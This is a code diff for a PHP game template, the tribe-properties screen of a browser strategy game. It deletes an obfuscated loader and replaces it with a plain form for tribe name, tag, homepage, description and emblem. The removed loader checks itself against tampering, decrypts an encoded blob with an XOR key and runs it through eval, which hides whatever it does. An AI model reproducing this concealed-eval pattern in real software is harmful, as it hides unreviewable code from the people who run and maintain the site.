@@ -1,24 +1,140 @@
-<?php
-$mvjqumvobnci="f60b448eb9b5b5fad8165dca4fb70461";
-$ytxwdwzhmpa="5506530351575e01535f5653560c5158050e550106015b0201565206010c0250";
-$tnbhbmtf="S+q+OKgRvVIh2EPA27mHl0QrAORa/9ErlwR9QtkJB4z+xhMhF0YEaCNONL9iZpC+X346mzibcPf4D/tnrWwzOjeBnNp6Fce9c6Cm1hEgiQAA7IN3EDWbamz8j86/2FNHevjKt/tgLG3UqlNtu8HJScF1YafZVvKa03yUTWLozkB+Tev5lMZ0dqUHlGEX3QAC9v4XofpmlsIXU5cyFepY5xSpzzAg7iAxw8tvkA9Pp38ND6kvJ66+ZSn4Lbp91A12ncvAMgANMoEYOb2uGdxbrBu4deUaTEe9EuxeTgImpy6Tpu/yWkNSKJUCCMjvgSMTGIoICAdGy/8gfdA9vGDoU/3Zad2psYSFQ6aWpwEjQaPm9tcmCyh8Z+v+05Y0k4Htm7GwWYLDJw9t2yiiA4n+QVnD7hNTBykauyTq5ShjxQYiojjH+EW5WpcyGQnHJAYwZOH2lQS7Dkcoarv/txqNLe8Wkt0wB3nhk8tB2Yw0PSCkNJRkPzuRMOH9Rg9SkWh6UQZxUbSDuFz11MR6z+6GENnwYxwDUzHZMXJ2SClrkeYUZo+ERfAeCXRccNWLSMB2z+VKTygNQqwUbWmKob4cmVj9dyWB3y2fppZc/SM0atwvOrBLlXZEMIorPcHuG8B5MJqn+BkY4ZxWYHOhdqBp6KhAirDUh7iTic8KkyKzMEWR4OgFHarK8y7RpneDL1OpSOa3uujHQC76ldsV8dtlTc40j1aYR3E+yajJNmZmQGp++Xweaw+M7NKSz/9MkhXkFNxaKSh6uGQF0Dh/7wX114kDaQPxNWaJxiLGpJeFnjTHJnf3teIQWXumDRf927aAK5q335K03J8kwVh1F67IGAtNr22yr9A0Nlx9t8Cfd5OQ1q+zj78J8pdBZV0kI1O/PqMYeci0J6bHKYMhynhbd+pVpB6opfjHI1K/JGBEUTr9iv2buQW50uS5T3Ocw0LizkkAbTjrfSLL9J5yRQzaZgaM0O+lpZONJnOun20C4+yCgF2acBtsxX84GcdhZY2zAY1/FvdKe5bVP5IXmhgV9HIrrzP/P507ddmimFUAXG56gU5qrwNSWXsf4aJLlvtDVwgC9GIneKCuZTb9Uvw8wBXUZIvfMDRY7aP4poB20i80QCReBAFQHnwnTMv+25HAoXZyKjIAaC8CRyPIiKYB94spZSr9W8eYzC/BqzKDKQCMzQrcZKdUc/qMBRzAEMpwCYDfGQlsuiwNXNB4scUvvaKbPMTZmXtck/aKnMTYALU3yBoPqRMOTgxrX/ZFBKOXTOl1NJgx/wJLVoG1RJlNOC9RLMVo32z7x0hRHpo52eZigeGE1kjOhXegbj4sfoiY19Lnlemnaie82eGmTcE/JKwVK5maYsyY/29zdTrw4Lc14x/FLyuKA+25WuM6fEYZe2YnytWerMFV+gF5oKKxZ8TU06lOLJ1UfNjNCTrIsN1G3eIMSt6gVemnkTpGw23sfqqOSBANHfL9iw5MAwfNCva7v2hP3CCQ32yl2ogu7MuKQ1Vhd4z4OIRHnnIVnxWlsXfDeyffs6yeivnjidWW6BPjT551gbH7dwDECPLBjp5G3zXqc52uMxVv0mJwh8L0QNofqf4qJGU/4J3naE0iGf6jziQ15pfq4OX2nTvri5kI";
-$tkdyvj=file_get_contents(__FILE__);
-$tqevafnz=str_replace($tnbhbmtf,"",$tkdyvj);
-if(strpos($tqevafnz,"ec"."ho")!==false||strpos($tqevafnz,"pr"."int")!==false||strpos($tqevafnz,"var_"."dump")!==false||strpos($tqevafnz,"file_put_"."contents")!==false||strpos($tqevafnz,"fw"."rite")!==false){die();}
-$hanusxxpo=str_replace(array($mvjqumvobnci,$ytxwdwzhmpa),array("SP_0e89afac","KP_a6d7cae2"),$tkdyvj);
-$jtigazkpfp=md5($hanusxxpo);
-$ohhxwag=hex2bin($ytxwdwzhmpa);
-$fvbhsxo="";
-$lrcffcuvkmn=strlen($jtigazkpfp);
-for($qalfcjtix=0;$qalfcjtix<$lrcffcuvkmn;$qalfcjtix++){
-$fvbhsxo.=chr(ord($ohhxwag[$qalfcjtix])^ord($jtigazkpfp[$qalfcjtix]));
-}
-$sssorxkqx=base64_decode($tnbhbmtf);
-$cjsjsow=strlen($sssorxkqx);
-$ykkffk="";
-$qcnvxu=strlen($fvbhsxo);
-for($qalfcjtix=0;$qalfcjtix<$cjsjsow;$qalfcjtix++){
-$ykkffk.=$sssorxkqx[$qalfcjtix]^$fvbhsxo[$qalfcjtix%$qcnvxu];
-}
-$beqfwhiqds="gzun"."compress";
-eval('?>' . $beqfwhiqds($ykkffk) . '<?php ');
+<?php if (!$is_leader): ?>
+    <p class="error"><?= __('screens.ally.only_leader_can_edit_properties') ?></p>
+<?php else: ?>
+    <?php if (!empty($error)): ?>
+        <p class="error"><?= $error ?></p>
+    <?php endif; ?>
+
+    <table width="100%">
+        <tr>
+            <td valign="top" width="50%">
+                <!-- Perfil Section -->
+                <form
+                    action="game.php?village=<?= $village['id'] ?>&screen=ally&mode=properties&action=update&h=<?= $session['hkey'] ?>"
+                    method="post">
+                    <table class="vis" width="100%">
+                        <tr>
+                            <th colspan="2"><?= __('screens.ally.profile') ?></th>
+                        </tr>
+                        <tr>
+                            <td width="180"><?= __('screens.ally.tribe_name') ?></td>
+                            <td><input type="text" name="name" value="<?= htmlspecialchars($ally['name']) ?>" size="30"
+                                    maxlength="30" required /></td>
+                        </tr>
+                        <tr>
+                            <td><?= __('screens.ally.tribe_tag') ?><br><small><?= __('screens.ally.max_6_letters') ?></small>
+                            </td>
+                            <td><input type="text" name="short" value="<?= htmlspecialchars($ally['short']) ?>" size="10"
+                                    maxlength="6" required /></td>
+                        </tr>
+                        <tr>
+                            <td><?= __('screens.ally.homepage') ?></td>
+                            <td><input type="text" name="homepage" value="<?= htmlspecialchars($ally['homepage'] ?? '') ?>"
+                                    size="30" /></td>
+                        </tr>
+                        <tr>
+                            <td><?= __('screens.ally.number_of_members') ?></td>
+                            <td><?= $ally['members'] ?></td>
+                        </tr>
+                        <tr>
+                            <td><?= __('screens.ally.points_top_40') ?></td>
+                            <td><?= number_format($ally['best_points'] ?? 0) ?></td>
+                        </tr>
+                        <tr>
+                            <td><?= __('screens.ally.total_points') ?></td>
+                            <td><?= number_format($ally['points']) ?></td>
+                        </tr>
+                        <tr>
+                            <td><?= __('screens.ally.average_points') ?></td>
+                            <td><?= $ally['members'] > 0 ? number_format(round($ally['points'] / $ally['members'])) : 0 ?>
+                            </td>
+                        </tr>
+                        <tr>
+                            <td><?= __('screens.ally.position') ?></td>
+                            <td><?= $ally['rank'] ?? '-' ?></td>
+                        </tr>
+                        <tr>
+                            <td colspan="2" align="right">
+                                <input type="submit" value="<?= __('screens.ally.change') ?>" class="btn" />
+                            </td>
+                        </tr>
+                    </table>
+                </form>
+
+                <br>
+
+                <!-- Dissolver Tribo Section -->
+                <table class="vis" width="100%">
+                    <tr>
+                        <th><?= __('screens.ally.dissolve_tribe') ?></th>
+                    </tr>
+                    <tr>
+                        <td align="center">
+                            <form
+                                action="game.php?village=<?= $village['id'] ?>&screen=ally&mode=properties&action=dissolve&h=<?= $session['hkey'] ?>"
+                                method="post" onsubmit="return confirm('<?= __('screens.ally.dissolve_confirm') ?>');">
+                                <input type="submit" value="<?= __('screens.ally.dissolve_tribe') ?>" class="btn"
+                                    style="background-color: #a00; color: white;" />
+                            </form>
+                        </td>
+                    </tr>
+                </table>
+            </td>
+
+            <td valign="top" width="50%" style="padding-left: 10px;">
+                <!-- Descrição Section -->
+                <form
+                    action="game.php?village=<?= $village['id'] ?>&screen=ally&mode=profile&action=update&h=<?= $session['hkey'] ?>"
+                    method="post">
+                    <table class="vis" width="100%">
+                        <tr>
+                            <th><?= __('screens.ally.description') ?></th>
+                        </tr>
+                        <tr>
+                            <td align="center">
+                                <?php $bbParser = new \App\Helpers\BBCodeParser(); ?>
+                                <?= $bbParser->parse($ally['description'] ?? '') ?>
+                                <br><br>
+                                <i><?= __('screens.ally.description_edit_note') ?></i>
+                                <br><br>
+                                <a
+                                    href="game.php?village=<?= $village['id'] ?>&screen=ally&mode=profile"><?= __('screens.ally.edit') ?></a>
+                            </td>
+                        </tr>
+                    </table>
+                </form>
+
+                <br>
+
+                <!-- Brasão da tribo Section -->
+                <form
+                    action="game.php?village=<?= $village['id'] ?>&screen=ally&mode=properties&action=update_image&h=<?= $session['hkey'] ?>"
+                    method="post">
+                    <table class="vis" width="100%">
+                        <tr>
+                            <th><?= __('screens.ally.tribe_emblem') ?></th>
+                        </tr>
+                        <tr>
+                            <td align="center">
+                                <?php if (!empty($ally['image'])): ?>
+                                    <img src="<?= htmlspecialchars($ally['image']) ?>" alt="<?= __('screens.ally.emblem') ?>"
+                                        style="max-width: 200px; max-height: 200px;">
+                                    <br><br>
+                                <?php endif; ?>
+
+                                <p><b><?= __('screens.ally.image_url') ?></b></p>
+                                <input type="url" name="image_url" value="<?= htmlspecialchars($ally['image'] ?? '') ?>"
+                                    size="40" placeholder="<?= __('screens.ally.image_url_placeholder') ?>">
+                                <br><br>
+                                <small><?= __('screens.ally.paste_direct_link') ?></small>
+                                <br><small><?= __('screens.ally.recommended_size') ?></small>
+                                <br><br>
+                                <input type="submit" value="<?= __('screens.ally.update_emblem') ?>" class="btn">
+                            </td>
+                        </tr>
+                    </table>
+                </form>
+            </td>
+        </tr>
+    </table>
+<?php endif; ?>
